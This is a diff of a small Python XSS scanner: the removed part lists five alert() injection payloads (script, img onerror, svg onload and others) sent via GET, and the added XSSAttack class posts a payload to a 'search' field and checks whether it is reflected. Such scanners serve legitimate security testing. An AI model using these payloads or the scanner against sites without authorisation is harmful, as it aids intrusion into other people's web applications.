@@ -1,25 +1,16 @@
 import requests
-import random
 
-XSS_PAYLOADS = [
-    "<script>alert('XSS')</script>",
-    "<img src='x' onerror='alert(1)'>",
-    "<svg/onload=alert('XSS')>",
-    "<iframe src='javascript:alert(1)'></iframe>",
-    "<input type='image' src='x' onerror='alert(2)'>"
-]
+class XSSAttack:
+    def __init__(self, target_url):
+        self.target_url = target_url
 
-def test_xss(url, param):
-    for payload in XSS_PAYLOADS:
-        full_url = f"{url}?{param}={payload}"
+    def attack(self, payload):
+        data = {'search': payload}
         try:
-            response = requests.get(full_url)
+            response = requests.post(self.target_url, data=data)
             if payload in response.text:
                 print(f"XSS vulnerability detected with payload: {payload}")
             else:
-                print(f"No vulnerability detected for payload: {payload}")
-        except requests.exceptions.RequestException as e:
-            print(f"Request failed: {e}")
-
-# Contoh penggunaan:
-# test_xss("http://target.com/search", "query")
+                print(f"No vulnerability found for payload: {payload}")
+        except requests.RequestException as e:
+            print(f"Error during XSS attack: {e}")
